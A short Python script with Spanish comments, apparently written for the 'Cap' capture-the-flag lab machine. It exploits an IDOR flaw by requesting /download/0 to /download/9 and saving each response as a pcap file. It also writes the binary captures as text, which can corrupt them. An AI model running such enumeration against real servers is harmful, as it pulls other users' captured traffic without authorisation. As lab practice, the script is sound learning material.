import argparse
import requests

# Creamos el parser para obtener la dirección IP como argumento de línea de comandos
parser = argparse.ArgumentParser(description='IDOR en máquina CAP')
parser.add_argument('ip', type=str, help='Dirección IP de la máquina')

# Parseamos los argumentos de la línea de comandos
args = parser.parse_args()

# Iteramos sobre los IDs del 0 al 9 (basado en inspección del servidor)
for i in range(10):
    # URL a descargar con el ID como parámetro
    url = f'http://{args.ip}/download/{i}'

    # Realizamos la solicitud GET a la URL
    response = requests.get(url)

    # Verificamos que la solicitud haya sido exitosa
    if response.status_code == 200:
        # Si la solicitud fue exitosa, guardamos la respuesta en un archivo
        with open(f'datos_{i}.pcap', 'w') as file:
            file.write(response.text)
            print(f'Datos descargados con éxito en datos_{i}.pcap')
    else:
        # Si la solicitud falló, imprimimos el código de error
        print(f'Error al descargar datos (código de error: {response.status_code})')
